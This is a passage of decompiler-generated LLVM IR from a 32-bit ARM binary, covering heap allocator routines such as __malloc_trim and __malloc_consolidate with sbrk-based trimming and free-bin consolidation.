  %v0_141a4 = load i32, i32* @r5, align 4
  store i32 %v0_141a4, i32* @r0, align 4
  %v0_141a8 = call i32 @free()
  store i32 %v0_141a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_141ac

dec_label_pc_141ac:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_14188, %dec_label_pc_14180, %dec_label_pc_140d8, %.thread6, %dec_label_pc_13f48, %dec_label_pc_14198
  store i32 %v2_13e94, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r2.global-to-local, align 4
  %v4_141bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_141bc)
  br label %dec_label_pc_141c8

dec_label_pc_141c8:                               ; preds = %dec_label_pc_13ec8, %dec_label_pc_13e70, %dec_label_pc_13e58, %dec_label_pc_141ac
  %v0_141c8 = load i32, i32* @r4, align 4
  store i32 %v0_141c8, i32* %r0.global-to-local, align 4
  store i32 %v3_13e38, i32* @r4, align 4
  store i32 %v6_13e38, i32* @r5, align 4
  store i32 %v9_13e38, i32* @r6, align 4
  store i32 %v12_13e38, i32* @r7, align 4
  store i32 %v15_13e38, i32* @r8, align 4
  store i32 %v18_13e38, i32* @sb, align 4
  store i32 %v21_13e38, i32* @sl, align 4
  store i32 %v24_13e38, i32* @fp, align 4
  store i32 %v27_13e38, i32* @lr, align 4
  ret i32 %v0_141c8

; uselistorder directives
  uselistorder i32 %v2_14160, { 1, 0, 2 }
  uselistorder i32 %v2_14148, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14124, { 1, 0, 2 }
  uselistorder i32 %v3_14104, { 1, 0, 2, 3 }
  uselistorder i32 %v1_140a8, { 2, 1, 0 }
  uselistorder i32 %v2_14078, { 1, 0, 2 }
  uselistorder i32 %v0_1400c, { 1, 0 }
  uselistorder i32 %v0_13fc8, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_13f2c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_13f24, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_13f08, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_13f00, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_13efc, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_13eec, { 1, 0 }
  uselistorder i32 %v0_13ee8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_13ec0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 20, 12, 14, 13, 21, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_141c8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_141ac, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_140d8, { 1, 0 }
  uselistorder label %dec_label_pc_14078, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_13fc4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13fb8, { 1, 0 }
  uselistorder label %dec_label_pc_13fb4, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_141dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_141dc:
  %v0_141dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_141dc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_141dc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_141dc, %bb
  %v10_141e8 = phi i32 [ %arg1, %dec_label_pc_141dc ], [ 0, %bb ]
  ret i32 %v10_141e8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_141f8 = add i32 %arg2, 44
  %v2_141f8 = inttoptr i32 %v1_141f8 to i32*
  %v3_141f8 = load i32, i32* %v2_141f8, align 4
  %v12_141fc = load i32, i32* @r7, align 4
  %v1_14200 = add i32 %v3_141f8, 4
  %v2_14200 = inttoptr i32 %v1_14200 to i32*
  %v3_14200 = load i32, i32* %v2_14200, align 4
  %v1_14204 = add i32 %arg2, 860
  %v2_14204 = inttoptr i32 %v1_14204 to i32*
  %v3_14204 = load i32, i32* %v2_14204, align 4
  store i32 %v3_14204, i32* @r4, align 4
  %v1_14208 = and i32 %v3_14200, -4
  store i32 %v1_14208, i32* @r6, align 4
  %v1_1420c = add i32 %v1_14208, -17
  %v2_14210 = add i32 %v1_1420c, %v3_14204
  store i32 %arg2, i32* @r5, align 4
  %v2_1421c = sub i32 %v2_14210, %arg1
  store i32 %v3_14204, i32* %r1.global-to-local, align 4
  %v2_14224 = udiv i32 %v2_1421c, %v3_14204
  %v1_14228 = add i32 %v2_14224, -1
  store i32 %v1_14228, i32* %r0.global-to-local, align 4
  %v2_1422c = mul i32 %v1_14228, %v3_14204
  store i32 %v2_1422c, i32* @r7, align 4
  %v2_14230 = icmp eq i32 %v2_1422c, 0
  store i1 %v2_14230, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_1422c, 1
  br i1 %tmp8, label %dec_label_pc_14298, label %dec_label_pc_14238

dec_label_pc_14238:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1423c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1423c, i32* %r0.global-to-local, align 4
  %v0_14240 = load i32, i32* @r5, align 4
  %v1_14240 = add i32 %v0_14240, 44
  %v2_14240 = inttoptr i32 %v1_14240 to i32*
  %v3_14240 = load i32, i32* %v2_14240, align 4
  %v0_14244 = load i32, i32* @r6, align 4
  %v2_14244 = add i32 %v0_14244, %v3_14240
  %v9_14248 = icmp eq i32 %v1_1423c, %v2_14244
  store i1 %v9_14248, i1* @cpsr_z, align 1
  store i32 %v1_1423c, i32* @r4, align 4
  br i1 %v9_14248, label %dec_label_pc_14254, label %dec_label_pc_14298

dec_label_pc_14254:                               ; preds = %dec_label_pc_14238
  %v0_14254 = load i32, i32* @r7, align 4
  %v1_14254 = sub i32 0, %v0_14254
  store i32 %v1_14254, i32* %r0.global-to-local, align 4
  %v1_14258 = call i32 @__GI_sbrk(i32 %v1_14254)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14260 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14260, i32* %r0.global-to-local, align 4
  %v7_14264 = icmp eq i32 %v1_14260, -1
  store i1 %v7_14264, i1* @cpsr_z, align 1
  br i1 %v7_14264, label %dec_label_pc_14298, label %dec_label_pc_1426c

dec_label_pc_1426c:                               ; preds = %dec_label_pc_14254
  %v0_1426c = load i32, i32* @r4, align 4
  %v2_1426c = sub i32 %v0_1426c, %v1_14260
  store i32 %v2_1426c, i32* %r0.global-to-local, align 4
  %v9_1426c = icmp eq i32 %v0_1426c, %v1_14260
  store i1 %v9_1426c, i1* @cpsr_z, align 1
  br i1 %v9_1426c, label %dec_label_pc_14298, label %dec_label_pc_14274

dec_label_pc_14274:                               ; preds = %dec_label_pc_1426c
  %v0_14274 = load i32, i32* @r5, align 4
  %v1_14274 = add i32 %v0_14274, 872
  %v2_14274 = inttoptr i32 %v1_14274 to i32*
  %v3_14274 = load i32, i32* %v2_14274, align 4
  %v1_14278 = load i32, i32* @r6, align 4
  %v2_14278 = sub i32 %v1_14278, %v2_1426c
  store i32 %v2_14278, i32* %r2.global-to-local, align 4
  %v1_1427c = add i32 %v0_14274, 44
  %v2_1427c = inttoptr i32 %v1_1427c to i32*
  %v3_1427c = load i32, i32* %v2_1427c, align 4
  store i32 %v3_1427c, i32* %r1.global-to-local, align 4
  %v2_14280 = sub i32 %v3_14274, %v2_1426c
  %v1_14284 = or i32 %v2_14278, 1
  store i32 %v1_14284, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_14280, i32* %v2_14274, align 4
  %v0_14290 = load i32, i32* %r2.global-to-local, align 4
  %v1_14290 = load i32, i32* %r1.global-to-local, align 4
  %v2_14290 = add i32 %v1_14290, 4
  %v3_14290 = inttoptr i32 %v2_14290 to i32*
  store i32 %v0_14290, i32* %v3_14290, align 4
  %v1_142a4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1429c

dec_label_pc_14298:                               ; preds = %dec_label_pc_14238, %dec_label_pc_1426c, %dec_label_pc_14254, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1429c

dec_label_pc_1429c:                               ; preds = %dec_label_pc_14274, %dec_label_pc_14298
  %v1_142a4 = phi i32 [ %v1_142a4.pre, %dec_label_pc_14274 ], [ 0, %dec_label_pc_14298 ]
  store i32 %v12_141fc, i32* @r7, align 4
  ret i32 %v1_142a4

; uselistorder directives
  uselistorder i1 %v7_14264, { 1, 0 }
  uselistorder i32 %v1_14260, { 2, 1, 0, 3 }
  uselistorder i32 %v3_14204, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1429c, { 1, 0 }
  uselistorder label %dec_label_pc_14298, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_142a8 = load i32, i32* @r4, align 4
  store i32 %v3_142a8, i32* %stack_var_-36, align 4
  %v0_142ac = load i32, i32* @r0, align 4
  %v1_142ac = inttoptr i32 %v0_142ac to i32*
  %v2_142ac = load i32, i32* %v1_142ac, align 4
  store i32 %v2_142ac, i32* %r3.global-to-local, align 4
  %v2_142b0 = icmp eq i32 %v2_142ac, 0
  store i32 %v0_142ac, i32* @r4, align 4
  br i1 %v2_142b0, label %dec_label_pc_143e8.preheader, label %dec_label_pc_142c4

dec_label_pc_143e8.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_143f025 = add i32 %v0_142ac, 52
  store i32 %v1_143f025, i32* %r3.global-to-local, align 4
  %v2_143f826 = add i32 %v0_142ac, 60
  %v3_143f827 = inttoptr i32 %v2_143f826 to i32*
  store i32 %v1_143f025, i32* %v3_143f827, align 4
  %v0_143fc28 = load i32, i32* %r3.global-to-local, align 4
  %v2_143fc29 = add i32 %v0_143fc28, 12
  %v3_143fc30 = inttoptr i32 %v2_143fc29 to i32*
  store i32 %v0_143fc28, i32* %v3_143fc30, align 4
  br label %dec_label_pc_143e8.dec_label_pc_143e8_crit_edge

dec_label_pc_142c4:                               ; preds = %entry
  %v1_142c4 = and i32 %v2_142ac, -3
  %v3_142c8 = udiv i32 %v2_142ac, 8
  store i32 %v3_142c8, i32* %r2.global-to-local, align 4
  store i32 %v1_142c4, i32* %v1_142ac, align 4
  %v0_142d0 = load i32, i32* @r0, align 4
  %v1_142d0 = add i32 %v0_142d0, -4
  store i32 %v1_142d0, i32* %r3.global-to-local, align 4
  %v1_142d4 = load i32, i32* %r2.global-to-local, align 4
  %v4_142d4 = mul i32 %v1_142d4, 4
  %v5_142d4 = add i32 %v4_142d4, %v1_142d0
  store i32 %v5_142d4, i32* %sb.global-to-local, align 4
  %v1_142d8 = add i32 %v0_142d0, 52
  store i32 %v1_142d8, i32* %r7.global-to-local, align 4
  %v1_142dc = add i32 %v0_142d0, 4
  store i32 %v1_142dc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_142e4

dec_label_pc_142e4:                               ; preds = %dec_label_pc_143e0, %dec_label_pc_142c4
  %v1_143d810 = phi i32 [ %v1_143d8, %dec_label_pc_143e0 ], [ %v5_142d4, %dec_label_pc_142c4 ]
  %v1_142f0 = phi i32 [ %v1_143e0, %dec_label_pc_143e0 ], [ %v1_142dc, %dec_label_pc_142c4 ]
  %v1_142e4 = inttoptr i32 %v1_142f0 to i32*
  %v2_142e4 = load i32, i32* %v1_142e4, align 4
  store i32 %v2_142e4, i32* %r1.global-to-local, align 4
  %v2_142e8 = icmp eq i32 %v2_142e4, 0
  br i1 %v2_142e8, label %dec_label_pc_143d8, label %dec_label_pc_142f0

dec_label_pc_142f0:                               ; preds = %dec_label_pc_142e4
  %v0_142f0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_142f0, i32* %v1_142e4, align 4
  %v0_142f4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_142f4

dec_label_pc_142f4:                               ; preds = %dec_label_pc_143cc, %dec_label_pc_142f0
  %v0_14310 = phi i32 [ %v0_143cc, %dec_label_pc_143cc ], [ %v0_142f4.pre, %dec_label_pc_142f0 ]
  %v1_142f4 = add i32 %v0_14310, 4
  %v2_142f4 = inttoptr i32 %v1_142f4 to i32*
  %v3_142f4 = load i32, i32* %v2_142f4, align 4
  store i32 %v3_142f4, i32* %r3.global-to-local, align 4
  %v1_142f8 = and i32 %v3_142f4, -2
  store i32 %v1_142f8, i32* %lr.global-to-local, align 4
  %v2_142fc = add i32 %v1_142f8, %v0_14310
  store i32 %v2_142fc, i32* @r0, align 4
  %v1_14300 = urem i32 %v3_142f4, 2
  %v2_14300 = icmp eq i32 %v1_14300, 0
  %v1_14304 = add i32 %v0_14310, 8
  %v2_14304 = inttoptr i32 %v1_14304 to i32*
  %v3_14304 = load i32, i32* %v2_14304, align 4
  store i32 %v3_14304, i32* %sl.global-to-local, align 4
  %v1_14308 = add i32 %v2_142fc, 4
  %v2_14308 = inttoptr i32 %v1_14308 to i32*
  %v3_14308 = load i32, i32* %v2_14308, align 4
  store i32 %v3_14308, i32* %r8.global-to-local, align 4
  br i1 %v2_14300, label %dec_label_pc_14310, label %dec_label_pc_14344

dec_label_pc_14310:                               ; preds = %dec_label_pc_142f4
  %v1_14310 = inttoptr i32 %v0_14310 to i32*
  %v2_14310 = load i32, i32* %v1_14310, align 4
  store i32 %v2_14310, i32* %r5.global-to-local, align 4
  %v2_14314 = sub i32 %v0_14310, %v2_14310
  store i32 %v2_14314, i32* %r3.global-to-local, align 4
  %v1_14318 = add i32 %v2_14314, 8
  %v2_14318 = inttoptr i32 %v1_14318 to i32*
  %v3_14318 = load i32, i32* %v2_14318, align 4
  store i32 %v3_14318, i32* @ip, align 4
  %v1_1431c = add i32 %v3_14318, 12
  %v2_1431c = inttoptr i32 %v1_1431c to i32*
  %v3_1431c = load i32, i32* %v2_1431c, align 4
  store i32 %v3_1431c, i32* %r1.global-to-local, align 4
  %v9_14320 = icmp eq i32 %v3_1431c, %v2_14314
  %v1_14324 = add i32 %v2_14314, 12
  %v2_14324 = inttoptr i32 %v1_14324 to i32*
  %v3_14324 = load i32, i32* %v2_14324, align 4
  store i32 %v3_14324, i32* %r2.global-to-local, align 4
  br i1 %v9_14320, label %dec_label_pc_1432c, label %dec_label_pc_14388

dec_label_pc_1432c:                               ; preds = %dec_label_pc_14310
  %v1_1432c = add i32 %v3_14324, 8
  %v2_1432c = inttoptr i32 %v1_1432c to i32*
  %v3_1432c = load i32, i32* %v2_1432c, align 4
  store i32 %v3_1432c, i32* %r3.global-to-local, align 4
  %v9_14330 = icmp eq i32 %v3_1432c, %v2_14314
  br i1 %v9_14330, label %dec_label_pc_14338, label %dec_label_pc_14388

dec_label_pc_14338:                               ; preds = %dec_label_pc_1432c
  store i32 %v3_14318, i32* %v2_1432c, align 4
  %v0_1433c = load i32, i32* %r2.global-to-local, align 4
  %v1_1433c = load i32, i32* @ip, align 4
  %v2_1433c = add i32 %v1_1433c, 12
  %v3_1433c = inttoptr i32 %v2_1433c to i32*
  store i32 %v0_1433c, i32* %v3_1433c, align 4
  %v0_14340 = load i32, i32* %lr.global-to-local, align 4
  %v1_14340 = load i32, i32* %r5.global-to-local, align 4
  %v2_14340 = add i32 %v1_14340, %v0_14340
  store i32 %v2_14340, i32* %lr.global-to-local, align 4
  %v0_14348.pre = load i32, i32* @r0, align 4
  %v0_1434c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14344

dec_label_pc_14344:                               ; preds = %dec_label_pc_142f4, %dec_label_pc_14338
  %v0_143bc = phi i32 [ %v1_142f8, %dec_label_pc_142f4 ], [ %v2_14340, %dec_label_pc_14338 ]
  %v0_1434c = phi i32 [ %v3_14308, %dec_label_pc_142f4 ], [ %v0_1434c.pre, %dec_label_pc_14338 ]
  %v1_14360 = phi i32 [ %v2_142fc, %dec_label_pc_142f4 ], [ %v0_14348.pre, %dec_label_pc_14338 ]
  %v0_14344 = load i32, i32* @r4, align 4
  %v1_14344 = add i32 %v0_14344, 44
  %v2_14344 = inttoptr i32 %v1_14344 to i32*
  %v3_14344 = load i32, i32* %v2_14344, align 4
  store i32 %v3_14344, i32* %r3.global-to-local, align 4
  %v9_14348 = icmp eq i32 %v1_14360, %v3_14344
  %v1_1434c = and i32 %v0_1434c, -4
  store i32 %v1_1434c, i32* %r5.global-to-local, align 4
  br i1 %v9_14348, label %dec_label_pc_143bc, label %dec_label_pc_14354

dec_label_pc_14354:                               ; preds = %dec_label_pc_14344
  %v2_14354 = add i32 %v1_14360, %v1_1434c
  store i32 %v2_14354, i32* %r3.global-to-local, align 4
  %v1_14358 = add i32 %v2_14354, 4
  %v2_14358 = inttoptr i32 %v1_14358 to i32*
  %v3_14358 = load i32, i32* %v2_14358, align 4
  store i32 %v3_14358, i32* %r3.global-to-local, align 4
  %v1_1435c = urem i32 %v3_14358, 2
  %v2_1435c = icmp eq i32 %v1_1435c, 0
  %v2_14360 = add i32 %v1_14360, 4
  %v3_14360 = inttoptr i32 %v2_14360 to i32*
  store i32 %v1_1434c, i32* %v3_14360, align 4
  br i1 %v2_1435c, label %dec_label_pc_14368, label %dec_label_pc_14354.dec_label_pc_14398_crit_edge

dec_label_pc_14354.dec_label_pc_14398_crit_edge:  ; preds = %dec_label_pc_14354
  %v0_1439c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14398

dec_label_pc_14368:                               ; preds = %dec_label_pc_14354
  %v0_14368 = load i32, i32* @r0, align 4
  %v1_14368 = add i32 %v0_14368, 8
  %v2_14368 = inttoptr i32 %v1_14368 to i32*
  %v3_14368 = load i32, i32* %v2_14368, align 4
  store i32 %v3_14368, i32* @ip, align 4
  %v1_1436c = add i32 %v3_14368, 12
  %v2_1436c = inttoptr i32 %v1_1436c to i32*
  %v3_1436c = load i32, i32* %v2_1436c, align 4
  store i32 %v3_1436c, i32* %r3.global-to-local, align 4
  %v9_14370 = icmp eq i32 %v3_1436c, %v0_14368
  %v1_14374 = add i32 %v0_14368, 12
  %v2_14374 = inttoptr i32 %v1_14374 to i32*
  %v3_14374 = load i32, i32* %v2_14374, align 4
  store i32 %v3_14374, i32* %r2.global-to-local, align 4
  br i1 %v9_14370, label %dec_label_pc_1437c, label %dec_label_pc_14388

dec_label_pc_1437c:                               ; preds = %dec_label_pc_14368
  %v1_1437c = add i32 %v3_14374, 8
  %v2_1437c = inttoptr i32 %v1_1437c to i32*
  %v3_1437c = load i32, i32* %v2_1437c, align 4
  store i32 %v3_1437c, i32* %r3.global-to-local, align 4
  %v9_14380 = icmp eq i32 %v3_1437c, %v0_14368
  br i1 %v9_14380, label %dec_label_pc_1438c, label %dec_label_pc_14388

dec_label_pc_14388:                               ; preds = %dec_label_pc_14368, %dec_label_pc_1432c, %dec_label_pc_14310, %dec_label_pc_1437c
  %v0_14388 = call i32 @abort()
  store i32 %v0_14388, i32* @r0, align 4
  %v0_1438c.pre = load i32, i32* @ip, align 4
  %v1_1438c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1438c

dec_label_pc_1438c:                               ; preds = %dec_label_pc_1437c, %dec_label_pc_14388
  %v1_1438c = phi i32 [ %v3_14374, %dec_label_pc_1437c ], [ %v1_1438c.pre, %dec_label_pc_14388 ]
  %v0_1438c = phi i32 [ %v3_14368, %dec_label_pc_1437c ], [ %v0_1438c.pre, %dec_label_pc_14388 ]
  %v2_1438c = add i32 %v1_1438c, 8
  %v3_1438c = inttoptr i32 %v2_1438c to i32*
  store i32 %v0_1438c, i32* %v3_1438c, align 4
  %v0_14390 = load i32, i32* %r2.global-to-local, align 4
  %v1_14390 = load i32, i32* @ip, align 4
  %v2_14390 = add i32 %v1_14390, 12
  %v3_14390 = inttoptr i32 %v2_14390 to i32*
  store i32 %v0_14390, i32* %v3_14390, align 4
  %v0_14394 = load i32, i32* %lr.global-to-local, align 4
  %v1_14394 = load i32, i32* %r5.global-to-local, align 4
  %v2_14394 = add i32 %v1_14394, %v0_14394
  store i32 %v2_14394, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14398

dec_label_pc_14398:                               ; preds = %dec_label_pc_14354.dec_label_pc_14398_crit_edge, %dec_label_pc_1438c
  %v0_1439c = phi i32 [ %v0_1439c.pre, %dec_label_pc_14354.dec_label_pc_14398_crit_edge ], [ %v2_14394, %dec_label_pc_1438c ]
  %v0_14398 = load i32, i32* %r7.global-to-local, align 4
  %v1_14398 = add i32 %v0_14398, 8
  %v2_14398 = inttoptr i32 %v1_14398 to i32*
  %v3_14398 = load i32, i32* %v2_14398, align 4
  store i32 %v3_14398, i32* %r2.global-to-local, align 4
  %v1_1439c = or i32 %v0_1439c, 1
  store i32 %v1_1439c, i32* %r3.global-to-local, align 4
  %v0_143a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_143a0, i32* %v2_14398, align 4
  %v0_143a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_143a4 = load i32, i32* %r2.global-to-local, align 4
  %v2_143a4 = add i32 %v1_143a4, 12
  %v3_143a4 = inttoptr i32 %v2_143a4 to i32*
  store i32 %v0_143a4, i32* %v3_143a4, align 4
  %v0_143a8 = load i32, i32* %lr.global-to-local, align 4
  %v1_143a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_143a8 = add i32 %v1_143a8, %v0_143a8
  %v4_143a8 = inttoptr i32 %v3_143a8 to i32*
  store i32 %v0_143a8, i32* %v4_143a8, align 4
  %v0_143ac = load i32, i32* %r3.global-to-local, align 4
  %v1_143ac = load i32, i32* %r1.global-to-local, align 4
  %v2_143ac = add i32 %v1_143ac, 4
  %v3_143ac = inttoptr i32 %v2_143ac to i32*
  store i32 %v0_143ac, i32* %v3_143ac, align 4
  %v0_143b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_143b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_143b0 = add i32 %v1_143b0, 8
  %v3_143b0 = inttoptr i32 %v2_143b0 to i32*
  store i32 %v0_143b0, i32* %v3_143b0, align 4
  %v0_143b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_143b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_143b4 = add i32 %v1_143b4, 12
  %v3_143b4 = inttoptr i32 %v2_143b4 to i32*
  store i32 %v0_143b4, i32* %v3_143b4, align 4
  br label %dec_label_pc_143cc

dec_label_pc_143bc:                               ; preds = %dec_label_pc_14344
  %v2_143bc = add i32 %v1_1434c, %v0_143bc
  %v1_143c0 = or i32 %v2_143bc, 1
  store i32 %v1_143c0, i32* %r3.global-to-local, align 4
  %v1_143c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_143c4 = add i32 %v1_143c4, 4
  %v3_143c4 = inttoptr i32 %v2_143c4 to i32*
  store i32 %v1_143c0, i32* %v3_143c4, align 4
  %v0_143c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_143c8 = load i32, i32* @r4, align 4
  %v2_143c8 = add i32 %v1_143c8, 44
  %v3_143c8 = inttoptr i32 %v2_143c8 to i32*
  store i32 %v0_143c8, i32* %v3_143c8, align 4
  br label %dec_label_pc_143cc

dec_label_pc_143cc:                               ; preds = %dec_label_pc_14398, %dec_label_pc_143bc
  %v0_143cc = load i32, i32* %sl.global-to-local, align 4
  %v2_143cc = icmp eq i32 %v0_143cc, 0
  store i32 %v0_143cc, i32* %r1.global-to-local, align 4
  br i1 %v2_143cc, label %dec_label_pc_143d8.loopexit, label %dec_label_pc_142f4

dec_label_pc_143d8.loopexit:                      ; preds = %dec_label_pc_143cc
  %v0_143d8.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_143d8.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_143d8

dec_label_pc_143d8:                               ; preds = %dec_label_pc_143d8.loopexit, %dec_label_pc_142e4
  %v1_143d8 = phi i32 [ %v1_143d8.pre, %dec_label_pc_143d8.loopexit ], [ %v1_143d810, %dec_label_pc_142e4 ]
  %v0_143e0 = phi i32 [ %v0_143d8.pre, %dec_label_pc_143d8.loopexit ], [ %v1_142f0, %dec_label_pc_142e4 ]
  %v9_143d8 = icmp eq i32 %v0_143e0, %v1_143d8
  br i1 %v9_143d8, label %dec_label_pc_14450, label %dec_label_pc_143e0

dec_label_pc_143e0:                               ; preds = %dec_label_pc_143d8
  %v1_143e0 = add i32 %v0_143e0, 4
  store i32 %v1_143e0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_142e4

dec_label_pc_143e8.dec_label_pc_143e8_crit_edge:  ; preds = %dec_label_pc_143e8.preheader, %dec_label_pc_143e8.dec_label_pc_143e8_crit_edge
  %v0_143e8.pre = load i32, i32* @r4, align 4
  %v1_143e8.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_143e8 = mul i32 %v1_143e8.pre, 8
  %v5_143e8 = add i32 %v4_143e8, %v0_143e8.pre
  %v1_143ec = add i32 %v1_143e8.pre, 1
  store i32 %v1_143ec, i32* %r2.global-to-local, align 4
  %v1_143f0 = add i32 %v5_143e8, 44
  store i32 %v1_143f0, i32* %r3.global-to-local, align 4
  %v2_143f8 = add i32 %v5_143e8, 52
  %v3_143f8 = inttoptr i32 %v2_143f8 to i32*
  store i32 %v1_143f0, i32* %v3_143f8, align 4
  %v0_143fc = load i32, i32* %r3.global-to-local, align 4
  %v2_143fc = add i32 %v0_143fc, 12
  %v3_143fc = inttoptr i32 %v2_143fc to i32*
  store i32 %v0_143fc, i32* %v3_143fc, align 4
  %v7_14400 = icmp sgt i32 %v1_143ec, 95
  br i1 %v7_14400, label %dec_label_pc_14404, label %dec_label_pc_143e8.dec_label_pc_143e8_crit_edge

dec_label_pc_14404:                               ; preds = %dec_label_pc_143e8.dec_label_pc_143e8_crit_edge
  %v0_14404 = load i32, i32* @r4, align 4
  %v1_14404 = inttoptr i32 %v0_14404 to i32*
  %v2_14404 = load i32, i32* %v1_14404, align 4
  store i32 %v2_14404, i32* %r2.global-to-local, align 4
  %v1_14408 = add i32 %v0_14404, 864
  %v2_14408 = inttoptr i32 %v1_14408 to i32*
  %v3_14408 = load i32, i32* %v2_14408, align 4
  %v1_14410 = urem i32 %v2_14404, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_14418 = or i32 %v3_14408, 1
  store i32 %v1_14418, i32* %r1.global-to-local, align 4
  %v1_1441c = or i32 %v1_14410, 72
  store i32 %v1_1441c, i32* %r2.global-to-local, align 4
  %v1_14420 = add i32 %v0_14404, 52
  store i32 %v1_14420, i32* @ip, align 4
  %v2_14424 = add i32 %v0_14404, 840
  %v3_14424 = inttoptr i32 %v2_14424 to i32*
  store i32 0, i32* %v3_14424, align 4
  store i32 ptrtoint (i32* @global_var_10000.35 to i32), i32* %r3.global-to-local, align 4
  %v0_1442c = load i32, i32* %r0.global-to-local, align 4
  %v1_1442c = load i32, i32* @r4, align 4
  %v2_1442c = add i32 %v1_1442c, 836
  %v3_1442c = inttoptr i32 %v2_1442c to i32*
  store i32 %v0_1442c, i32* %v3_1442c, align 4
  %v0_14430 = load i32, i32* %r0.global-to-local, align 4
  %v1_14430 = load i32, i32* @r4, align 4
  %v2_14430 = add i32 %v1_14430, 844
  %v3_14430 = inttoptr i32 %v2_14430 to i32*
  store i32 %v0_14430, i32* %v3_14430, align 4
  %v1_14434 = load i32, i32* @r4, align 4
  %v2_14434 = add i32 %v1_14434, 852
  %v3_14434 = inttoptr i32 %v2_14434 to i32*
